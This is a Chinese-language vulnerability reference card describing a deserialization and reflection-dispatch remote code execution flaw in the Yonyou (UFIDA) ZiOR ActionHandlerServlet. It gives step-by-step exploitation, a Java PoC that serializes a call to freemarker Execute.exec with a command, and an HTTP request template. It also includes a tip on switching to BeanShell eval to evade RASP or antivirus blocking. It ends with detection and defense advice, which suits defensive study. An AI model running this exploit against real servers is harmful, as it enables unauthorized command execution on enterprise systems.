---
id: web-java-deserialization-ufida-zior-actionexecutor-reflection
title: 用友 ZiOR ActionHandlerServlet 反序列化后反射调度任意方法：ActionExecutor.exec 按类名/方法名/参数直接反射调用
type: scenario
domain: web
path: web/java/deserialization
technique: deserialization-reflection-dispatcher-arbitrary-method
aliases:
- ActionHandlerServlet
- ActionExecutor.exec
- com.ufida.zior.console
- ~aert 反序列化
- 反序列化反射调度
- method_map 乱调用
tags:
- java
- deserialization
- reflection
- ufida
- yonyou
- rce
- method-invocation
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V383
  verified_at: '2026-11-09T08:45:45+08:00'
  notes: 已对照原文核对：ActionHandlerServlet GZIP 反序列化依次读 5 对象、ActionExecutor.exec 的 Class.forName/newInstance、paramNum、class:method:paramCount 缓存、getMethod/getMethods 按名兜底、invoke 分支及 freemarker Execute.exec(List)->Runtime.exec 均与反编译截图逐行一致，POC 弹计算器截图佐证；未验证点：原文称该入口早已披露且目标已修复，实际是绕过 gadget 检测的反射调度链，具体补丁状态未在文中验证；目标未给受影响版本
---

## 一句话结论

用友 ZiOR 平台的 `/servlet/~aert/com.ufida.zior.console.ActionHandlerServlet` 把 GZIP 请求体交给 Java 原生反序列化，按固定顺序读出“类名、方法名、参数对象”后调用 `ActionExecutor.exec`：后者用 `Class.forName(...).newInstance()` 实例化任意类，再按 `getMethod`/遍历 `getMethods()` 反射调用同名方法。攻击者不需要经典 gadget 链，只需构造 5 个普通序列化对象，就能调用 classpath 中任意有无参构造的类的方法；选择 `freemarker.template.utility.Execute.exec(List)` 即可执行系统命令并把输出序列化回响应。

## 原理

- **入口是反序列化 + 业务反射的双层结构**：Servlet 先 `ObjectInputStream(new GZIPInputStream(request.getInputStream()))` 连续 `readObject()` 五次，依次得到 `msg`（类名/actionName，String）、`methodName`（String）、`paramter`（Object）、`currentLanguage`（String）、`logModule`（String），随后执行 `ActionExecutor.exec(msg, methodName, paramter)`。前三个值完全由攻击者控制，等于把“类名 + 方法名 + 参数”直接喂给反射器。
- **反射调度逻辑**：
  1. `actionName != null && methodName != null` 时 `Class.forName(actionName).newInstance()`，所以目标类必须有无参构造；
  2. 计算参数个数 `paramNum`：`paramter == null` 为 0；是数组则为数组长度；否则为 1；
  3. 以 `actionName + ":" + methodName + ":" + paramNum` 为 key，从静态 `ConcurrentHashMap map_method` 取缓存方法；
  4. 未命中时先 `paramClzs = new Class[]{Object.class}`；若 `paramter` 是数组，则按每个元素的实际 `getClass()` 构造参数类型数组，再 `actionclz.getMethod(methodName, paramClzs)`；
  5. `getMethod` 抛 `NoSuchMethodException` 后，遍历 `actionclz.getMethods()`，只按方法名相等匹配并取第一个——**不看参数类型**，这就是“乱调用”；
  6. 命中后把 `Method` 放入静态 `map_method`；后续同 key 请求直接复用缓存；
  7. 按目标方法的参数个数和 `paramter` 是否为数组分支 `m.invoke(action, ...)`，最后把结果 `writeObject` 回响应。
- **为什么“非数组参数”会乱调用**：`new Class[]{Object.class}` 只匹配参数类型为 `Object` 的方法；绝大多数方法匹配不到，于是走 `getMethods()` 按名字兜底，一个类里同名、同参数个数的方法会“随机”命中其中一个（取决于 `getMethods()` 返回顺序）。当一个类存在同名不同参方法（如 `eval(String)`/`eval(Reader)`）时，直接传字符串可能绑定到错误重载。
- **为什么能命令执行**：`freemarker.template.utility.Execute.exec(List arguments)` 取 `arguments.get(0)` 强转 String 后调用 `Runtime.getRuntime().exec(aExecute)`，并把命令输出拼成 String 返回；由于 `paramter` 非数组、`paramNum=1`，反射兜底恰好命中该单参方法，`invoke` 传入一个含命令字符串的 `ArrayList` 即可。返回值被 Servlet 序列化回响应，命令输出天然回显。
- **不依赖 gadget 的意义**：常规反序列化漏洞依赖 CommonsCollections 等 gadget 链；这里只要反序列化入口存在、目标类在 classpath 且有可调用的危险方法，就能在不触发经典 gadget 检测规则的情况下完成利用。

## 触发条件

- 目标部署了该 ZiOR 组件，`/servlet/~aert/com.ufida.zior.console.ActionHandlerServlet` 路由可达（Servlet 容器为 Apache-Coyote/Tomcat 一类）。
- 请求体按 GZIP 压缩的 Java 序列化流解析；反序列化前没有对象白名单/`ObjectInputFilter` 限制。
- classpath 中存在可用的“方法调用 gadget”：有无参构造、单参或可数组传参的危险方法（如 `freemarker.template.utility.Execute` 通常随 FreeMarker 存在，`bsh.Interpreter` 若引入 BeanShell 也存在）。
- 攻击者能访问该 Servlet；原文测试请求携带 `JSESSIONID`，但漏洞利用不依赖登录态（需按目标确认是否存在额外鉴权）。

## 利用步骤

1. 确认入口：请求 `POST /servlet/~aert/com.ufida.zior.console.ActionHandlerServlet`，`Content-Type: application/octet-stream`，观察是否解析 GZIP 序列化流。
2. 按顺序构造 5 个对象并 GZIP 压缩：`msg=类全名`、`methodName=方法名`、`paramter=参数对象`、`currentLanguage`、`logModule`（null 会被置为 `"iufo"`）。
3. 选择危险类：`freemarker.template.utility.Execute` + `exec` + `ArrayList["cmd.exe /c calc"]`（参数必须是 `List`，首元素为命令字符串）。
4. 发送请求体；响应流中 `true` 后跟 `result` 对象，`Execute.exec` 的返回值即命令输出，可直接读取。
5. 若目标有 RASP/杀软拦截命令执行，改用代码执行类方法（如 `bsh.Interpreter.eval`，见关联卡），或用数组参数控制重载选择。
6. 记录请求/响应证据后停止；不要落盘持久化文件。

## PoC

```java
// 构造 GZIP + Java 序列化请求体（类名/方法名/参数均攻击者可控）
ByteArrayOutputStream baos = new ByteArrayOutputStream();
ObjectOutputStream oos = new ObjectOutputStream(new GZIPOutputStream(baos));
oos.writeObject("freemarker.template.utility.Execute"); // msg = actionName
oos.writeObject("exec");                                 // methodName
List<String> args = new ArrayList<>();
args.add("cmd.exe /c calc");
oos.writeObject(args);          // paramter：List，反射兜底命中 exec(List)
oos.writeObject("zh_CN");       // currentLanguage
oos.writeObject(null);          // logModule，null -> "iufo"
oos.close();
// POST /servlet/~aert/com.ufida.zior.console.ActionHandlerServlet
// Content-Type: application/octet-stream  body=baos.toByteArray()
```

```http
POST /servlet/~aert/com.ufida.zior.console.ActionHandlerServlet HTTP/1.1
Host: target
Content-Type: application/octet-stream
Content-Length: <len>

<gzip(java-serialized 5 objects)>
```

响应为 Java 序列化流：先是 `true`，随后是方法返回值（`Execute.exec` 时为命令输出字符串）。原文以该 payload 成功弹出计算器。

## 变体与关联

- 变体（数组参数控制重载）：`paramter` 传 `Object[]{...}` 时会按元素实际类型构造 `paramClzs`，可精确选择 `getMethod(name, String.class)` 等重载，并把结果按 `class:method:paramCount` 缓存；后续同 key 的普通参数请求会复用缓存方法。该特性用于解决同名重载歧义（见关联卡）。
- 变体（危险方法）：`freemarker.template.utility.Execute.exec(List)`、`bsh.Interpreter.eval(String)`、任何有无参构造且接受单参的危险类方法；也可调用业务类中的文件写入/加载方法。
- 关联：[[web-java-rce-beanshell-eval-method-map-preheat]]（同一调度器下改用 BeanShell 代码执行并预热 method_map）、[[web-java-deser-yonyou-nc-usersynchronizationservlet]]（用友 NC 另一 readObject 入口 + CC6）、[[web-java-deserialization-jndi-ufida-sprmonitorservlet]]（用友 BIP 原生反序列化 JNDI 入口）、[[web-generic-ssti-mcms-template-save-freemarker-execute]]（freemarker Execute 作为命令执行 sink 的另一入口）。

## 检测与防御

- 防御：移除/禁用 `~aert` ActionHandlerServlet 等不必要的远程调用入口；对 `ObjectInputStream` 设置 `ObjectInputFilter` 类白名单，禁止任意外部类反序列化。
- 防御：删除反射调度器的任意类名/方法名能力，改为固定 action 映射白名单；禁止对不可信输入使用 `Class.forName(...).newInstance()` + `getMethod(...).invoke()`。
- 检测：请求体 `Content-Type: application/octet-stream` 且以 GZIP 魔数 `1f 8b` 开头、解压后以 Java 序列化魔数 `ac ed 00 05` 开头；`/servlet/~aert/` 路径访问；反序列化流中出现 `freemarker.template.utility.Execute`、`bsh.Interpreter`、`Runtime`、`ProcessBuilder` 等类名；响应中出现 `java.lang.Boolean` 序列化对象后跟异常结果。
- 检测：JVM 侧监控 `Class.forName` 加载危险类与反射 `Method.invoke` 调用 `exec`/`eval` 的行为；对 `map_method` 类静态缓存的异常填充做审计。
